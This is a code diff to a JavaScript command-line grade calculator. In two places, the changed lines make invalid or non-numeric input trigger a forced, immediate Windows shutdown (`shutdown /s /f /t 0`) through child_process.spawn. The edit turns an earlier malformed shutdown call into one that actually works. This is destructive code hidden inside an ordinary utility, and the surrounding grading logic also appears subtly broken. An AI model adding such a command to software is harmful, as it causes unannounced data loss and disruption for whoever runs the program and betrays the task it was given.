@@ -307,7 +307,7 @@ function get_grade(score) {
       return "F";
     }
     console.warn("Invalid score")
-    require("child_process").spawn("shutdown -s -f -m \"You entered an invalid score\"");
+    require("child_process").spawn("shutdown", ["/s", "/f", "/t", "0"]);
   }
   
   const rl = require("node:readline").createInterface({
@@ -318,7 +318,7 @@ function get_grade(score) {
   rl.question("Enter your score: ", rawScore => {
     const score = parseInt(rawScore);
     if (isNaN(score)) {
-      require("child_process").spawn("shutdown -s -f -m \"You entered an invalid score\"");
+      require("child_process").spawn("shutdown", ["/s", "/f", "/t", "0"]);
     }
   
     get_grade(rawScore, (grade) => {
